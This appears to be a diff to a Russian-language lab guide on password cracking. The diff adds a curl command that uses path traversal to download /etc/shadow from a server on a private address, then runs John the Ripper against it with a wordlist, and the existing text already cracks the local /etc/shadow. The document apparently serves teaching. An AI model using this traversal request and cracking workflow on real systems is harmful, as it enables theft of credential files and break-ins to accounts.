@@ -47,6 +47,7 @@ student@debian:~$ su -
 ```
 apt install john
 apt install wget
+apt install curl
 ```
 
 Тест
@@ -68,4 +69,13 @@ wget https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Cre
 Запускаем перебор паролей
 ```
 john --wordlist=/root/10-million-password-list-top-1000000.txt --format=crypt /etc/shadow
+```
+
+Скачаем файл паролей с server
+```
+curl --path-as-is http://192.168.10.10/../../../etc/shadow > shadow.txt
+```
+Запускаем перебор паролей
+```
+john --wordlist=/root/10-million-password-list-top-1000000.txt --format=crypt shadow.txt
 ```
